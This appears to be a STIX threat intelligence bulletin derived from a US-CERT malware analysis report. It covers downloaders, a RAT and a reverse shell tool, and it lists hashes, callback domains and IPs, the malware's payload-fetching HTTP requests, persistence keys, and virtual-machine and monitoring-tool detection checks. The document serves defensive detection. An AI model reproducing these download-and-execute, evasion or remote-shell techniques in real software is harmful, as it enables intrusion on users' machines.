stix:STIX_Header.stix:Title: Malicious Downloaders, RAT, and Reverse Shell Utility Submitted for Analysis
stix:STIX_Header.stix:Description:
On 31 January 2014, five malicious files were submitted for analysis.
Downloaders: report.exe (MD5: ca115cc64402208f5e37f289cf1941b5) USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc) snkhymrh.exe (MD5: 067be741c9ce9bf8471f0af9fc9b5f1b)
Remote Administrative Tool: Pretrial_Embedded.dll (MD5: a3e29e9e0adcc295a702350c4d5781ed)
Reverse shell utility: Payment receipt 61665.exe (MD5: b149d2a2d6e065113915e2a13766c16a)
The following call back sites were identified: allindiapackermover.com homevisitor.co.uk aarushenterprises.com 4-access.com 62.113.232.164 176.9.245.16 103.14.200.33 188.227.165.115 168.144.82.97
This IB references US-CERT Malware Initial Findings Report MIFR-342934.

stix:Indicator.indicator:Description: Compile Date 2009-12-05 22:50:52 UTC Analysis The submitted file is a dropper for an embedded PE file, "\%TEMP%\snkhymrh.exe". The file contains a large buffer of extraneous data beginning at offset 0x8400. The data begins with the string, "NullsoftInstx". The dropper also creates two additional files during execution: "\%TEMP%\setup.dat" --> This file contains embedded binary data that begins at offset 0xC5BA. "\%TEMP%\rs.dat" --> This file contains embedded binary data that begins at offset 0x13BB2. RELEVANT RESOURCE DATA -----> Name: Icon Entry Label: 1 Content: This resource object contains an icon of a desktop computer with a CD and a box. Name: Dialog Label: 105 Content: 105 DIALOGEX 0, 0, 280, 162, 0 STYLE DS_SETFONT | DS_FIXEDSYS | DS_CENTER | WS_POPUPWINDOW | WS_DLGFRAME | WS_MINIMIZEBOX LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US FONT 8, "MS Shell Dlg" { PUSHBUTTON "", 3, 171, 142, 50, 14, NOT WS_VISIBLE | WS_GROUP PUSHBUTTON "", 1, 223, 142, 50, 14 PUSHBUTTON "", 2, 7, 142, 50, 14 LTEXT "", -1, 7, 138, 267, 1, SS_ETCHEDHORZ CONTROL "", 1018, "STATIC", NOT WS_VISIBLE | SS_BLACKRECT, 7, 6, 266, 130 CTEXT "", 1028, 59, 145, 108, 8, WS_DISABLED } Name: Dialog Label: 106 Content: 106 DIALOGEX 0, 0, 266, 130, 0 STYLE DS_SETFONT | DS_FIXEDSYS | DS_CONTROL | WS_CHILD LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US FONT 8, "MS Shell Dlg" { CONTROL "", 1004, "msctls_progress32", WS_BORDER, 24, 10, 241, 11 CONTROL "", 1006, "STATIC", NOT WS_GROUP | SS_BLACKRECT | SS_GRAYFRAME | SS_NOPREFIX, 24, 0, 241, 8 CONTROL "", 1016, "SysListView32", NOT WS_VISIBLE | WS_BORDER | WS_TABSTOP | 0x00004005, 0, 25, 265, 104 ICON 103, 1031, 0, 0, 22, 20 PUSHBUTTON "", 1027, 0, 28, 60, 14, NOT WS_TABSTOP } Name: Dialog Label: 111 Content: 111 DIALOGEX 0, 0, 162, 22, 0 STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | DS_CENTER | Packer Microsoft Visual Basic v5.0 Compile Date 2014-01-21 21:11:42 UTC Callbacks 62.113.232.164 176.9.245.16 Relationships file-2 callback-to host-5 file-2 callback-to host-6 Analysis The residual file is a downloader that calls back the following IP addresses via TCP port 80: 62.113.232.164 192.154.97.240 (only SYN packets are sent to this IP) GET REQUEST (62.113.232.164): GET /jUM1zPe9W2HGFLcIMP32b9EuQRsUcSoiOQPAIY0bKP9g1DI6kJssZ96Zv%2fEBt1PI3D2RWwL7BVHT2F23q 1XIXy9O7J2nVMa60vxDZBQGBgATyRpg5RxYugpnp6Kw70IBDDO92LbNNWLoXpm75Ns%2bs19u4xmKbvFM5GW NZ9l7VL8LHZMKAgv6QTEU4DIP54X9BB7rd8hCtD6PGQBbq5%2bKSk6Ax%2bm84ta%2fQtQtoh9IhENd9aFrF XewCCixVneNe%2bmxn7Q12NLpsSC3uVzUhLsQYvFKuj1sAWyIYB41aGhTWFnCPJ2VvFh7B%2b3l4kfGLdwOm 03rAO2bDPfUcqXb24MTleDvIYp8gZQzU16Lk7Q6F%2fUYcVne5cyo5PDI9y8OrlVEbbYY8EHMi%2f0g2zKRU 46oGc00X4otgdGZQ1YYkAKq0HhVWe5e7CYdUG8u4LWm0U1FBlbtlSO7t5UC6psDaqwfglY HTTP/1.1 Accept: */* Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: 62.113.232.164 Connection: Keep-Alive
The file also injects code into the system process, "svchost.exe". The injected code spawns an instance of Internet Explorer ("iexplore.exe"). The child process, "iexplore.exe" calls back to the following IP address via TCP port 80: 176.9.245.16 GET REQUEST (176.9.245.16): GET /jUM1zPe9W2HGFLcIMP32b9EuQRsUcSoiOQPAIY0bKP9g1DI6kJssZ96Zv%2fEBt1PI3D2RWwL7BVHT2F23 q1XIXy9O7J2nVMa60vxDZBQGBgATyRpg5RxYugpnp6Kw70IBDDO92LbNNWLoXpm75Ns%2bs19u4xmKbvFM5 GWNZ9l7VL8LHZMKAgv6QTEU4DIP54X9BB7rd8hCtD6PGQBbq5%2bKSk6Ax%2bm84ta%2fQtQtoh9IhENd9a FrFXewCCixVneNe%2bmxn7Q12NLpsSC3uVzUhLsQYvFKuj1sAWyIYB41aGhTWFnCPJ2VvFh7B%2b3l4kfGL dwOm03rAO2bDPfUcqXb24MTleDvIYp8gZQzU16Lk7Q6F%2fUYcVne5cyo5PDI9y8OrlVEbbYY8EHMi%2f0g 2zKRU46oGc00X4otgdGZQ1YYkAKq0HhVWe5e7CYdUG8u4LWm0U1FBlbtlSO7t5UC6psDaqwfglY HTTP/1.1 Accept: */* Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: 176.9.245.16 Connection: Keep-Alive

Compile Date 2014-01-21 15:07:58 UTC Analysis The submitted file is a loader for an embedded DLL file. When executed, file drops a copy of itself into the file path: "\%USERPROFILE%\Local Settings\Application Data\ojvcacsa.exe". The file name used is not static. The file executes the Windows system application, "svchost.exe", decodes an embedded DLL file, writes the DLL file to the memory space of the "svchost.exe" process and executes the DLL file. The residual DLL file has not file name because it is not written to disk during execution. It will be referred to as, "Pretrial_Embedded.dll".

Compile Date 2014-01-21 09:22:27 UTC Registry "Software\Microsoft\Windows\CurrentVersion\Run" Callbacks 103.14.200.33 188.227.165.115 168.144.82.97
The residual file is injected into the process, "svchost.exe" by the loader file, "Pretrial_Notice_Washington_01_21_copy.exe". S..<;.7. 00000220 be 9d 96 df 2b 18 c7 47 56 59 a3 77 61 58 6d 61 ....+..G VY.waXma 00000230 57 8e 87 55 35 3a 58 1f 43 e2 44 4b 5e 3f 60 24 W..U5:X. C.DK^?`$ 00000240 e6 85 76 e2 b2 73 a2 78 b7 ab bb a3 27 3a ..v..s.x ....':
Entrenchment ----> The file is capable of setting the following registry key for persistence purposes: "Software\Microsoft\Windows\CurrentVersion\Run"
VM AND SYSTEM UTILITY AWARENESS -----> The file is capable of enumerating running processes and parsing for VMWare/VirtualBox /Parallels/ related processes as well as some system monitoring tools (See below):
VMWare/VirtualBox/Parallels: VBoxTray.exe VBoxService.exe vmusrvc.exe vmsrvc.exe prl_cc.exe prl_tools.exe
System Monitoring Tools: wireshark.exe Tfrmrpcap iptools.exe ProcessHacker
The file is also capable of detecting virtual environments by parsing specific values in the local registry: SYSTEM\CurrentControlSet\services\Disk\Enum SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD&DEV_0774&SUBSYS_040515AD&REV_00 SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&DEV_CAFE&SUBSYS_00000000&REV_00 SYSTEM\CurrentControlSet\Enum\PCI\VEN_5333&DEV_8811&SUBSYS_00000000&REV_00 SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&DEV_BEEF&SUBSYS_00000000&REV_00 SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&DEV_CAFE&SUBSYS_00000000&REV_00 HARDWARE\ACPI\DSDT\AMIBI HARDWARE\DESCRIPTION\System\BIOS
PDB String: C:\Users\DmitryHELL\Documents\SysIQUA\loader_1.4 s2\loader_v4\loader_v3\Release\dll.pdb Export Functions -----> Name: Work Ordinal: 1 Entry Point: 0x10004DC0

Packer: Microsoft Visual C++ Compile Date: 2014-01-21 18:15:44 UTC
The submitted file is a reverse shell utility. When executed, the file opens port 3232, binds to the port, and listens. If a connection is made, the file executes "cmd.exe" in the current working directory and sends the command shell over the open port to the remote host. The data sent over the wire is not obfuscated.
This file was previously identified in another malicious email campaign described in IB-14-10037. The emails used a Barclays theme.

Packer: Borland Delphi 4.0 Compile Date: 2012-04-14 12:00:51 UTC Call backs: aarushenterprises.com 4-access.com
Analysis The submitted file is a downloader. During execution, the following events occur: A class called, "grita" is registered. The window procedure parameter of the new class points to the function beginning at offset 0x401786. A new window called, "kovice" is created which executes the window procedure. A large buffer of shellcode beginning at file offset 0x1087 is decoded. The de-obfuscated code is responsible for the following tasks:
The file checks to see if it is running from the directory: "C:\DOCUME~1\ADMINI~1\LOCALS~\Temp\winupdater.exe". If not, the file is copied to the prevsiously mentioned file and executed. If the file is running from the %TEMP% directory, a GET request is sent to the domain, "aarushenterprises.com" via port 443, using HTTPS.
GET /images/icons/pdf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: aarushenterprises.com Cache-Control: no-cache The downloaded file is saved to the directory, "\%TEMP%\slond.exe" and is executed. The process then terminates. NOTE: An additional URL (4-access.com) was located in the strings within the shellcode buffer.
RELEVANT RESOURCE DATA -----> Name: Icon Entry Label: 1 Content: This resource object contains an icon used for Portable Document Format (PDF) files. Name: Manifest Label: 1 Content: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><assemblyxmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfoxmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>
RELEVANT STRING DATA -----> helk edit kovice static grita button edit DECODED STRINGS -----> winupdater.exe slond.exe %s%s %s\%s open Updates downloader text/* application/* aarushenterprises.com /images/icons/pdf.exe 4-access.com /images/stories/fruit/pdf.exe

If the file USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc) is running from the %TEMP% directory, a GET request is sent to the domain, aarushenterprises.com via port 443, using HTTPS.
GET /images/icons/pdf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: aarushenterprises.com Cache-Control: no-cache
The downloaded file was saved to a directory (\%TEMP%\slond.exe) and executed. The process then terminated.
This domain was located in the strings within the shellcode buffer of the file USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc).

Antivirus Kaspersky Trojan.Win32.Bublik.bvez McAfee Downloader-FJH Microsoft TrojanDownloader:Win32/Upatre.L Symantec Downloader.Trojan TrendMicro TROJ_UPATRE.HYT Packer Borland Delphi 4.0 Compile Date 2012-04-14 12:02:28 UTC Callbacks allindiapackermover.com homevisitor.co.uk
Analysis The submitted file is a downloader. During execution, the following events occur: A class called, "grita" is registered. The window procedure parameter of the new class points to the function beginning at offset 0x401786. A new window called, "kovice" is created which executes the window procedure. A large buffer of shellcode beginning at file offset 0x1002 is decoded. The de-obfuscated code is responsible for the following tasks: The file checks to see if it is running from the directory: "C:\DOCUME~1\ADMINI~1\LOCALS~ \Temp\realupdater.exe". If not, the file is copied to the prevsiously mentioned file and executed. If the file is running from the %TEMP% directory, a GET request is sent to the domain, "allindiapackermover.com" via port 443, using HTTPS. GET /images/pdf.exe HTTP/1.1 Accept: text/*, application/* User-Agent: Updates downloader Host: allindiapackermover.com Cache-Control: no-cache The downloaded file is saved to the directory, "\%TEMP%\slonk.exe" and is executed. The process then terminates. NOTE: An additional URL (homevisitor.co.uk) was located in the strings within the shellcode buffer. RELEVANT RESOURCE DATA -----> Name: Icon Entry Label: 1 Content: This resource object contains an icon used for Portable Document Format (PDF) files. Name: Manifest Label: 1 Content: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedEx ecutionLevel level="asInvoker" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly> RELEVANT STRING DATA -----> helk edit kovice static grita button US-CERT MIFR-342934 17 of 32 TLP: GREEN TLP: GREEN edit DECODED STRINGS -----> realupdater.exe slonk.exe %s%s %s\%s open Updates downloader text/* application/* allindiapackermover.com /images/pdf.exe homevisitor.co.uk /images/banners/pdf.exe
This domain was listed in the strings within the shellcode buffer of the file report.exe (MD5: ca115cc64402208f5e37f289cf1941b5).
